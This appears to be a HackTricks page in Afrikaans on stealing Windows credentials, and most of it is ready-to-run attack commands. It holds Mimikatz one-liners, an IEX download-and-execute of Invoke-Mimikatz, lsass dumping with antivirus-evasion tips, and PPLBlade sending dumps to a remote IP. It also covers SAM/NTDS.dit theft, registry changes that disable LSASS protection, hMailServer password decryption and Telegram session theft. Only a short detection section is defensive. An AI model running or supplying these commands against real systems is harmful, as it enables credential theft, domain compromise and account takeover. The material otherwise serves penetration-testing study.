# Windows-aanmeldbewyse steel

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz-aanmeldbewyse

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Vind ander dinge wat Mimikatz kan doen op** [**hierdie bladsy**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Lees hier oor moontlike beskerming van aanmeldbesonderhede.**](credentials-protections.md) **Hierdie beskerming kan voorkom dat Mimikatz sommige aanmeldbesonderhede onttrek.**

## Aanmeldbesonderhede met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **wagwoorde en hashes te soek** op die slagoffer.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV omseil

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**’n wettige Microsoft-hulpmiddel is**, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie hulpmiddel gebruik om **die lsass-proses te dump**, **die dump af te laai** en **die geloofsbriewe plaaslik uit die dump te onttrek**.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Hierdie proses word outomaties met [SprayKatz](https://github.com/aas-n/spraykatz) uitgevoer: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Let wel**: Sommige **AV** kan die gebruik van **procdump.exe om lsass.exe te dump** as **kwaadwillig bespeur**. Dit is omdat hulle die stringe **"procdump.exe" en "lsass.exe"** **bespeur**. Daarom is dit **meer stealthy** om die **PID** van lsass.exe as **argument** aan procdump deur te gee, **in plaas van** die **naam lsass.exe**.

### Dumping van lsass met **comsvcs.dll**

’n DLL genaamd **comsvcs.dll**, wat in `C:\Windows\System32` gevind word, is verantwoordelik vir die **dump van prosesgeheue** wanneer ’n crash plaasvind. Hierdie DLL bevat ’n **funksie** genaamd **`MiniDumpW`**, wat met `rundll32.exe` opgeroep kan word.\
Die eerste twee argumente is irrelevant, maar die derde een word in drie komponente verdeel. Die proses-ID wat gedump moet word, is die eerste komponent; die ligging van die dump-lêer is die tweede, en die derde komponent moet presies die woord **full** wees. Daar is geen alternatiewe opsies nie.\
Nadat hierdie drie komponente ontleed is, word die DLL gebruik om die dump-lêer te skep en die gespesifiseerde proses se geheue daarin te plaas.\
**comsvcs.dll** kan gebruik word om die lsass-proses te dump, wat die behoefte uitskakel om procdump op te laai en uit te voer. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Die volgende opdrag word vir uitvoering gebruik:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **lsass dump met Taakbestuurder**

1. Regskliek op die taakbalk en klik op Taakbestuurder
2. Klik op Meer besonderhede
3. Soek die proses "Local Security Authority Process" in die Processes-oortjie
4. Regskliek op die proses "Local Security Authority Process" en klik op "Create dump file".

### lsass dump met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is ’n binêre lêer wat deur Microsoft onderteken is en deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-suite.

’n Bestaande volledige stelselongelukstortingslêer, of ’n saamgeperste kopie in ’n toeganklike gebruiker-lêergids, kan steeds geloofsbrieflêermateriaal bevat vir vanlyn ontleding. Lêername soos `MEMORY.DMP` en `MEMORY.7z` is slegs leidrade vir ondersoek: verifieer die oorsprong en toegang, en moenie aanvaar dat dit bruikbare of huidige geloofsbriewe bevat nie.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is ’n Protected Process Dumper Tool wat geheuestortings kan verdoesel en dit na afgeleë werkstasies kan oordra sonder om dit op skyf te skryf.

**Sleutelfunksies**:

1. Om PPL-beskerming te omseil
2. Om geheuestortingslêers te verdoesel om Defender se handtekeninggebaseerde opsporingsmeganismes te ontduik
3. Om geheuestortings met RAW- en SMB-oplaaimetodes op te laai sonder om dit op skyf te skryf (lêerlose storting)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – SSP-gebaseerde LSASS-dumping sonder MiniDumpWriteDump

Ink Dragon versprei ’n drie-fase dumper met die naam **LalsDumper** wat nooit `MiniDumpWriteDump` aanroep nie, dus word EDR-hooks op daardie API nooit geaktiveer nie:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – soek in `fdp.dll` na ’n plekhouer wat uit 32 kleinletter-`d`-karakters bestaan, vervang dit met die absolute pad na `rtu.txt`, stoor die aangepaste DLL as `nfdp.dll` en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die kwaadwillige DLL as ’n nuwe Security Support Provider (SSP) te laai.
2. **Stage 2 binne LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XOR elke greep met `0x20` en karteer die gedekodeerde blob in die geheue voordat uitvoering oorgedra word.
3. **Stage 3 dumper** – die gekarteerde payload implementeer MiniDump-logika weer met **direct syscalls** wat vanaf gehashte API-name opgelos word (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). ’n Toegewyde uitvoer genaamd `Tom` maak `%TEMP%\<pid>.ddt` oop, skryf ’n saamgeperste LSASS-dump na die lêer en sluit die handvatsel sodat exfiltration later kan plaasvind.

Operateurnotas:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll` en `rtu.txt` in dieselfde gids. Stage 1 vervang die hard-coded plekhouer met die absolute pad na `rtu.txt`, dus breek dit die ketting as jy hulle skei.
* Registrasie vind plaas deur `nfdp` by `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` te voeg. Jy kan daardie waarde self vooraf invul sodat LSASS die SSP met elke selflaai herlaai.
* `%TEMP%\*.ddt`-lêers is saamgeperste dumps. Decompress dit plaaslik en voer dit dan aan Mimikatz/Volatility vir credential extraction.
* Om `lals.exe` uit te voer, word admin/SeTcb-regte vereis sodat `AddSecurityPackageA` slaag; sodra die oproep terugkeer, laai LSASS deursigtig die skelm SSP en voer Stage 2 uit.
* As jy die DLL van die skyf verwyder, word dit nie uit LSASS verwyder nie. Vee óf die registerinskrywing uit en herbegin LSASS (herlaai die stelsel), óf laat dit staan vir langtermyn-persistence.

## CrackMapExec

### Dump SAM-hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA-geheime

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump die NTDS.dit vanaf die teiken-DC

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump die NTDS.dit-wagwoordgeskiedenis vanaf die teiken-DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Wys die pwdLastSet-kenmerk vir elke NTDS.dit-rekening

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Diefstal van SAM & SYSTEM

Hierdie lêers behoort **geleë** te wees in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan hulle nie sommer op gewone manier kopieer nie**, omdat hulle beskerm word.

### Vanuit die Register

Die maklikste manier om hierdie lêers te steel, is om ’n kopie uit die register te kry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Laai** daardie lêers na jou Kali-masjien af en **onttrek die hashes** met:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Jy kan hierdie diens gebruik om kopieë van beskermde lêers te maak. Jy moet ’n Administrateur wees.

#### Using vssadmin

Die vssadmin-binêre lêer is slegs in Windows Server-weergawes beskikbaar.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Maar jy kan dieselfde vanuit **Powershell** doen. Dit is 'n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word, is "C:" en dit word in C:\users\Public gestoor), maar jy kan dit gebruik om enige beskermde lêer te kopieer:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om ’n kopie van SAM, SYSTEM en ntds.dit te maak.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory** en bevat belangrike data oor gebruikerobjekte, groepe en hul lidmaatskappe. Dit is waar die **password hashes** vir domeingebruikers gestoor word. Hierdie lêer is ’n **Extensible Storage Engine (ESE)**-databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.

Drie primêre tabelle word in hierdie databasis onderhou:

- **Data Table**: Hierdie tabel stoor besonderhede oor voorwerpe soos gebruikers en groepe.
- **Link Table**: Dit hou verhoudings, soos groeplidmaatskappe, dop.
- **SD Table**: **Security descriptors** vir elke voorwerp word hier gehou om die sekuriteit en toegangsbeheer vir die gestoorde voorwerpe te verseker.

Christoffer Andersson se navorsing oor die databasislaag dokumenteer hierdie tabelle en hul weergawe-spesifieke gedrag in meer besonderhede.<sup>[[8]](#references)</sup>

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer, en dit word deur _lsass.exe_ gebruik. Dan kan **’n deel** van die **NTDS.dit**-lêer **binne die `lsass`**-geheue geleë wees (jy kan waarskynlik die data waartoe die jongste toegang verkry is, vind weens die prestasieverbetering wat ’n **cache** bied).

#### Dekriptie van die hashes binne NTDS.dit

Die hash word drie keer geïnkripteer:

1. Dekripteer die Password Encryption Key (**PEK**) met die **BOOTKEY** en **RC4**.
2. Dekripteer die **hash** met die **PEK** en **RC4**.
3. Dekripteer die **hash** met **DES**.

Die **PEK** het dieselfde waarde op elke domeinbeheerder, maar dit is **geïnkripteer** binne **NTDS.dit** met die domeinbeheerder-spesifieke **BOOTKEY** van daardie domeinbeheerder se **SYSTEM**-hive. Om geloofsbriewe te onttrek, is dus beide **NTDS.dit** en **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) nodig.

### Kopiëring van NTDS.dit met Ntdsutil

Beskikbaar sedert Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system)-truuk gebruik om die **ntds.dit**-lêer te kopieer. Onthou dat jy ook ’n kopie van die **SYSTEM-lêer** nodig het (gebruik weer die [**dump dit uit die register of gebruik die volume shadow copy**](#stealing-sam-and-system)-truuk).

### **Hashes uit NTDS.dit onttrek**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** **verkry** het, kan jy nutsmiddels soos _secretsdump.py_ gebruik om die **hashes te onttrek**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Jy kan hulle ook **outomaties onttrek** met behulp van 'n geldige domeinadministrateurrekening:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Vir **groot NTDS.dit-lêers** word dit aanbeveel om dit met [gosecretsdump](https://github.com/c-sto/gosecretsdump) te onttrek.

Uiteindelik kan jy ook die **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject` gebruik.

### **Onttrekking van domeinobjekte uit NTDS.dit na ’n SQLite-databasis**

NTDS-objekte kan met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) na ’n SQLite-databasis onttrek word. Nie net geheime word onttrek nie, maar ook die volledige objekte en hul eienskappe vir verdere inligtingsonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Die `SYSTEM`-hive is opsioneel, maar maak die dekripsie van geheime moontlik (NT- en LM-hashes, aanvullende geloofsbriewe soos gewone tekswagwoorde, Kerberos- of trust-sleutels, NT- en LM-wagwoordgeskiedenisse). Saam met ander inligting word die volgende data onttrek: gebruikers- en masjienrekeninge met hul hashes, UAC-vlae, tydstempel van die laaste aanmelding en wagwoordverandering, rekeningbeskrywings, name, UPN, SPN, groepe en rekursiewe lidmaatskappe, boomstruktuur en lidmaatskap van organisatoriese eenhede, vertroude domeine met trusttipes, rigting en eienskappe...

## Lazagne

Laai die binêre lêer [hier](https://github.com/AlessandroZ/LaZagne/releases) af. Jy kan hierdie binêre lêer gebruik om geloofsbriewe uit verskeie sagtewarepakkette te onttrek.

```
lazagne.exe all
```

## Ander nutsgoed om geloofsbriewe uit SAM en LSASS te onttrek

### Windows credentials Editor (WCE)

Hierdie nutsding kan gebruik word om geloofsbriewe uit die geheue te onttrek. Laai dit af vanaf: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek geloofsbriewe uit die SAM-lêer

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Onttrek aanmeldbesonderhede uit die SAM-lêer

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Laai dit af vanaf:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) en **voer dit net uit**, waarna die wagwoorde onttrek sal word.

## Ontginning van onaktiewe RDP-sessies en verswakking van sekuriteitskontroles

Ink Dragon se FinalDraft RAT bevat ’n `DumpRDPHistory`-tasker waarvan die tegnieke nuttig is vir enige red-teamer:<sup>[[3]](#references)</sup>

### Telemetrieversameling in die styl van DumpRDPHistory

* **Uitgaande RDP-teikens** – ontleed elke gebruikershive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke subsleutel stoor die bedienernaam, `UsernameHint` en die tydstempel van die laaste skryfbewerking. Jy kan FinalDraft se logika met PowerShell naboots:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Bewyse van inkomende RDP** – raadpleeg die `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational`-logboek vir gebeurtenis-ID's **21** (suksesvolle aanmelding) en **25** (ontkoppeling) om vas te stel wie die stelsel geadministreer het:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (met LalsDumper/Mimikatz) terwyl hul **ontkoppelde** sessie steeds bestaan. CredSSP + NTLM-fallback laat hul verifier en tokens in LSASS agter, wat dan oor SMB/WinRM herhaal kan word om `NTDS.dit` te bekom of volharding op domeinbeheerders te bewerkstellig.

### Register-afgraderings wat deur FinalDraft geteiken word

Dieselfde implant peuter ook aan verskeie registersleutels om diefstal van geloofsbriewe makliker te maak:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Deur `DisableRestrictedAdmin=1` in te stel, word volle hergebruik van geloofsbriewe/kaartjies tydens RDP afgedwing, wat pass-the-hash-styl-pivots moontlik maak.
* `LocalAccountTokenFilterPolicy=1` deaktiveer UAC-tokenfiltrering sodat plaaslike admins onbeperkte tokens oor die netwerk kry.
* `DSRMAdminLogonBehavior=2` laat die DSRM-administrateur toe om aan te meld terwyl die DC aanlyn is, wat aanvallers nog ’n ingeboude rekening met hoë voorregte gee.
* `RunAsPPL=0` verwyder LSASS PPL-beskerming, wat geheuetoegang eenvoudig maak vir dumpers soos LalsDumper.

## hMailServer-konfigurasiegeloofsbriewe (ná kompromittering)

Gaan die presiese konfigurasielêers `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` en `C:\ProgramData\hMailServer\hMailServer.ini` na volgens die installasie-uitleg. ’n Leesbare, nie-leë `[Security] AdministratorPassword=`-waarde is ’n hMailServer-administrasiewagwoordhash; dit is nie bewys van ’n Windows Administrator-wagwoord nie. As daardie geloofsbrief herwin word, vereis enige pivot na ’n Windows-rekening dat wagwoordhergebruik en aanmeldregte onafhanklik geverifieer word.

Vir installasies wat ’n SQL CE-databasis gebruik, beskerm die afsonderlike `[Database] Password=`-waarde in die INI die databasis. In ouer installasies is hierdie waarde met die statiese sleutel `THIS_KEY_IS_NOT_SECRET` en 4-greep-woord-endianness-omruilings Blowfish-geënkripteer. Gebruik die heksadesimale string uit die INI met hierdie Python-brokkie:<sup>[[2]](#references)</sup>

Bevestig eers dat die huidige rekening beide die INI en die ooreenstemmende SQL CE `.sdf`-databasis kan lees. Die INI-wagwoord beskerm die databasis; dit is apart van die posbusrekeninghashes wat daarin gestoor word. Inspekteer of gradeer ’n **kopie** van ’n databasis wat in gebruik is op—moet nooit die aktiewe lêer gebruik nie.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Met die clear-text-wagwoord, kopieer die SQL CE-databasis om lêerslotte te vermy, laai die 32-bis-provider en gradeer dit op indien nodig voordat jy navraag doen oor die hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Die `accountpassword`-kolom gebruik die hMailServer-hashformaat (hashcat-modus `1421`). ’n Gebreekte posbuswagwoord word slegs ’n Windows-gebruiker-pivot as daardie wagwoord deur ’n plaaslike/domeinrekening hergebruik word en daardie rekening die vereiste regte vir afstandaanmelding het.

## Onderskepping van LSA-aanmeldterugroepfunksie (LsaApLogonUserEx2)

Sommige nutsmiddels vang **plaintext-aanmeldwagwoorde** vas deur die LSA-aanmeldterugroepfunksie `LsaApLogonUserEx2` te onderskep. Die idee is om die terugroepfunksie van die verifikasiepakket te haak of omhul sodat geloofsbriewe **tydens aanmelding** (voor hashing) vasgevang word en dan na skyf geskryf of aan die operateur teruggestuur word. Dit word gewoonlik geïmplementeer as ’n helper wat in LSA inspuit of daarby registreer, en dan elke suksesvolle interaktiewe/netwerkaanmeldgebeurtenis met die gebruikersnaam, domein en wagwoord aanteken.<sup>[[1]](#references)</sup>

Operasionele notas:
- Vereis plaaslike admin/SYSTEM om die helper in die verifikasiepad te laai.
- Vasgevangde geloofsbriewe verskyn slegs wanneer ’n aanmelding plaasvind (interaktiewe, RDP-, diens- of netwerkaanmelding, afhangend van die haak).

## SSMS-gestoorde verbindinggeloofsbriewe (sqlstudio.bin)

SQL Server Management Studio (SSMS) stoor gestoorde verbindinginligting in ’n `sqlstudio.bin`-lêer per gebruiker. Toegewyde dumpers kan die lêer ontleed en gestoorde SQL-geloofsbriewe herwin. In shells wat slegs opdraguitvoer terugstuur, word die lêer dikwels uitgevoer deur dit as Base64 te enkodeer en na stdout te druk.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Aan die operateur se kant, bou die lêer weer en voer die dumper plaaslik uit om aanmeldbewyse te herwin:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Browsersessie- en koekiediefstal via Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop `tdata`-sessiediefstal

Telegram Desktop hou magtigings- en rekeningtoestand in sy **`tdata`**-gids. ’n Gekopieerde sessie kan deur versoenbare nutsmiddels gelaai word om sonder die rekeningwagwoord te staaf terwyl daardie magtiging geldig bly; as plaaslike data-enkripsie geaktiveer is, benodig die stealer ook die wagwoordkode. ’n Gestaafde sessie kan dan identiteitsdata, metadata oor gesprekke en lidmaatskap, boodskappe en aflaaibare media blootlê.<sup>[[10]](#references)</sup>

### Opsporing en verkryging

Soek in beide geïnstalleerde en draagbare uitlegte; Microsoft Store-pakketname verskil, dus lys pakketgidse wat `TelegramMessenge` bevat en ondersoek hul `LocalCache\Roaming`-subgids.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

As gewone leesbewerkings misluk en die proses se token reeds `SeBackupPrivilege` bevat en dit geaktiveer is, bied rugsteunbewuste toegang ’n terugvalopsie; dit verkry nie die voorreg of verhoog die proses se regte nie. `CreateFileW` met `FILE_FLAG_BACKUP_SEMANTICS` kan rugsteun-/herstel-semantiek aanvra en lêersekuriteitskontroles omseil wanneer die vereiste tokenvoorregte teenwoordig is, maar die vlag alleen omseil nie ’n onversoenbare deel-slot nie.<sup>[[10]](#references)[[11]](#references)</sup>

Skep/lees ’n **Volume Shadow Copy** vir lêers wat tans gesluit is; vir lêers wat deur ACL’s geblokkeer word, gebruik `robocopy /B` rugsteunmodus en omseil dit lêer- en gids-ACL’s.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

’n Bandwydtebewuste implantaat kan aanvanklik net die lêerpadinventaris indien, ’n momentopname-identifiseerder plus die paaie wat reeds deur die C2 gestoor is ontvang, en slegs ontbrekende lêers oplaai. Klein inkrementele oordragte ná rekursiewe `tdata`-enumerasie kan dus steeds op suksesvolle sessiediefstal dui.<sup>[[10]](#references)</sup>

### Opsporing en inperking

Korreleer rekursiewe toegang tot `tdata` deur ’n nie-Telegram-proses met die aktivering van `SeBackupPrivilege`, lêeropenings met rugsteunsemantiek, VSS-aktiwiteit of ’n kindproses `robocopy.exe` wat `/B` gebruik. Soek ook na vinnige enumerasie van beide `%APPDATA%` en `%LOCALAPPDATA%\Packages`, gevolg deur uitgaande verbindings vanaf dieselfde proses. Gebruik ná ’n kompromittering **Instellings → Toestelle** (of **Privaatheid en sekuriteit → Aktiewe sessies**) om onbekende sessies te beëindig; die aktivering van tweestapverifikasie alleen herroep nie ’n magtiging wat reeds gesteel is nie.<sup>[[10]](#references)[[13]](#references)</sup>

## Diefstal van Passkeys / WebAuthn-aanmeldbewyse uit Chrome op Windows

As kode-uitvoering as die **slagoffer-gebruiker** verkry word op ’n Windows-gasheer wat **Chrome + gesinkroniseerde passkeys in Google Password Manager** gebruik, word passkeys ’n interessante teiken ná uitbuiting, selfs **sonder admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante plaaslike artefakte

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** stoor protobuf-geënkodeerde **`WebauthnCredentialSpecifics`**-rekords. ’n Proses van dieselfde gebruiker kan die **RP ID**, **gebruikersnaam**, **credential ID** en geënkripteerde private-sleutelmateriaal vir gesinkroniseerde passkeys opsom.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** stoor plaaslike toestelregistrasietoestand, soos **`wrapped_identity_private_key`** en die toegedraaide geheim wat gebruik word om gesinkroniseerde credentials te herstel.<sup>[[4]](#references)</sup>

Vinnige triage:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-gebonde sleutelblobbe kan steeds as ’n plaaslike ondertekeningsorakel misbruik word

As die blaaier ’n TPM-ondersteunde identiteitsleutel as **`NCRYPT_OPAQUE_KEY_BLOB`** uitvoer en daardie blob in ’n gebruiker-toeganklike toestand stoor, hoef malware **nie** die rou privaat sleutel te onttrek nie. Dit kan die blob eenvoudig weer op **dieselfde masjien** invoer en die plaaslike TPM vra om data te onderteken wat deur ’n aanvaller beheer word:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Dit beteken **hardware-binding voorkom uitvoer van die toestel af, maar nie gebruik deur dieselfde gebruiker op die gekompromitteerde endpoint nie**.

